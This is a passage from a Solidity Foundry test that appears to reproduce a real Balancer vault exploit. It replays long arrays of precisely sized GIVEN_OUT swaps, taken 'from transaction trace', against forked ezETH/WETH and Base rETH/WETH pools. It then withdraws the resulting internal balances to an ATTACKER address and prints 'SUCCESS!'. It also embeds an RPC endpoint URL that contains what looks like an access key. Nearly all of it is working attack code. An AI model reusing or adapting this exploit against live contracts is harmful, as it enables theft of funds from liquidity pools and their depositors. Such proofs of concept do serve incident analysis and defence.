        swaps[69] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 4600000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[70] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 382876, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[71] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[72] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 3300000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[73] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 20734, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[74] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[75] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 2300000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[76] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 1079, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[77] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[78] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 1600000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[79] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 355, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[80] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[81] = ExactSwapData({ tokenIn: ezETH, tokenOut: address(WETH), amount: 1080000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[82] = ExactSwapData({ tokenIn: ezETH, tokenOut: ezETH_WETH_BPT, amount: 10000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[83] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH_WETH_BPT, amount: 10000000, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[84] = ExactSwapData({ tokenIn: ezETH, tokenOut: ezETH_WETH_BPT, amount: 10000000000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[85] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH_WETH_BPT, amount: 10000000000000, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[86] = ExactSwapData({ tokenIn: ezETH, tokenOut: ezETH_WETH_BPT, amount: 10000000000000000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[87] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH_WETH_BPT, amount: 10000000000000000000, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[88] = ExactSwapData({ tokenIn: ezETH, tokenOut: ezETH_WETH_BPT, amount: 597922002076198159981, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[89] = ExactSwapData({ tokenIn: address(WETH), tokenOut: ezETH_WETH_BPT, amount: 597922002076198159981, expectedIn: 0, indexIn: 2, indexOut: 0 });


        console.log("Executing swaps...");
        uint256 successCount = 0;

        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_EZETH,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(swaps[i].tokenIn),
                assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount,
                userData: ""
            });

            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) {
                successCount++;
            } catch {
                // Continue on failure
            }
        }

        console.log("Swaps executed:", successCount, "/", swaps.length);

        // Withdrawal manageUserBalance
        IERC20[] memory internalTokens = new IERC20[](3);
        internalTokens[0] = IERC20(ezETH_WETH_BPT);
        internalTokens[1] = IERC20(ezETH);
        internalTokens[2] = IERC20(address(WETH));

        uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);

        console.log("Internal balances:");
        console.log("  BPT:", internalBalances[0] / 1e18, "ETH");
        console.log("  ezETH:", internalBalances[1] / 1e18, "ETH");
        console.log("  WETH:", internalBalances[2] / 1e18, "ETH");

        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0) {
            uint256 opsCount = 0;
            if (internalBalances[0] > 0) opsCount++;
            if (internalBalances[1] > 0) opsCount++;
            if (internalBalances[2] > 0) opsCount++;

            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;

            if (internalBalances[0] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(ezETH_WETH_BPT),
                    amount: internalBalances[0],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[1] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(ezETH),
                    amount: internalBalances[1],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[2] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(address(WETH)),
                    amount: internalBalances[2],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            VAULT.manageUserBalance(ops);
            console.log("Withdrawal completed!");
        }

        vm.stopPrank();

        (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_EZETH);

        console.log("FINAL STATE:");
        console.log("BPT:", finalBalances[0]);
        console.log("ezETH:", finalBalances[1] / 1e18, "ETH");
        console.log("WETH:", finalBalances[2] / 1e18, "ETH");

        console.log("ATTACKER BALANCES:");
        console.log("BPT:", IERC20(ezETH_WETH_BPT).balanceOf(ATTACKER) / 1e18);
        console.log("ezETH:", IERC20(ezETH).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");

        console.log("Total swaps executed:", successCount);
        console.log("SUCCESS!");
    }

    function testBasePool() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.base-mainnet.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            37683327
        );

        console.log("Pool: rETH/WETH (Base)");
        console.log("Transaction: 0xe9245fb124c3a6ff6a0e39c6d0db02b74b3a3d805f6bf016f4b9ac56cbfb73ae");

        (, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_BASE);

        console.log("INITIAL STATE:");
        console.log("WETH (index 0):", initialBalances[0]);
        console.log("rETH (index 1):", initialBalances[1]);
        console.log("BPT (index 2):", initialBalances[2]);

        // Fund attacker with BPT directly for exact swaps
        deal(BASE_POOL_BPT, BASE_ATTACKER, 10000 ether);

        vm.startPrank(BASE_ATTACKER);
        IERC20(BASE_POOL_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(BASE_WETH).approve(address(VAULT), type(uint256).max);
        IERC20(BASE_rETH).approve(address(VAULT), type(uint256).max);

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: BASE_ATTACKER,
            fromInternalBalance: true,
            recipient: payable(BASE_ATTACKER),
            toInternalBalance: true
        });

        // 106 exact swaps from transaction trace
        ExactSwapData[106] memory swaps;
        swaps[0] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 16941129211957497338, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[1] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 23786060032823179715, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[2] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 169411292119574974, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[3] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 237860600328231798, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[4] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 1694112921195750, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[5] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 2378606003282318, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[6] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 16941129211957, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[7] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 23786060032823, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[8] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 169411292120, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[9] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 237860600328, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[10] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 1694112921, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[11] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 2378606003, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[12] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 16941129, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[13] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 23786060, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[14] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 169411, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[15] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 237861, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[16] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 1694, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[17] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 2378, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[18] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 18, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[19] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 25, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[20] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 39993, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[21] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[22] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 288000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[23] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 28289, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[24] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[25] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 225000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[26] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 27869, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[27] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[28] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 171000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[29] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 23158, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[30] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[31] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 126000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[32] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 14946, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[33] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[34] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 99000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[35] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 13949, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[36] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[37] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 81000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[38] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 16015, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[39] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[40] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 63900, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[41] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 14000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[42] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[43] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 50400, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[44] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 12203, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[45] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[46] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 40500, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[47] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 10397, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[48] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[49] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 32400, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[50] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 9362, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[51] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[52] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 24300, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[53] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6079, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[54] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[55] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 21600, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[56] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6961, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[57] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[58] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 18000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[59] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6224, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[60] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[61] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 13770, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[62] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 4274, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[63] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[64] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 12150, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[65] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 4153, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[66] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[67] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 10800, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[68] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 4058, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[69] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[70] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 8910, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[71] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 3291, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[72] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[73] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 8100, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[74] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 3199, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[75] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[76] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 6966, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[77] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 2883, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[78] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[79] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 6075, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[80] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 2649, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[81] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[82] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 5670, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[83] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 2541, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[84] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[85] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 5265, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[86] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 2408, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[87] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[88] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 5103, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[89] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 2366, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[90] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[91] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 4941, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[92] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 2278, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[93] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[94] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 4455, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[95] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 2120, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[96] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[97] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 4212, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[98] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 2034, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[99] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[100] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 4131, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[101] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 2024, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[102] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[103] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 4050, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[104] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 1990, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[105] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });

        console.log("Total swaps:", swaps.length);

        uint256 successCount = 0;

        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_BASE,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(swaps[i].tokenIn),
                assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount,
                userData: ""
            });

            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) returns (uint256) {
                successCount++;
            } catch {
                // Continue on failure
            }
        }

        console.log("Swaps executed:", successCount);

        vm.stopPrank();

        (, uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_BASE);

        console.log("FINAL STATE:");
        console.log("WETH (index 0):", finalBalances[0] / 1e18, "ETH");
        console.log("rETH (index 1):", finalBalances[1] / 1e18, "ETH");
        console.log("BPT (index 2):", finalBalances[2]);

        console.log("ATTACKER BALANCES:");
        console.log("BPT:", IERC20(BASE_POOL_BPT).balanceOf(BASE_ATTACKER) / 1e18);
        console.log("WETH:", IERC20(BASE_WETH).balanceOf(BASE_ATTACKER) / 1e18, "ETH");
        console.log("rETH:", IERC20(BASE_rETH).balanceOf(BASE_ATTACKER) / 1e18, "ETH");

        console.log("Total swaps executed:", successCount);
        console.log("SUCCESS!");
    }
}
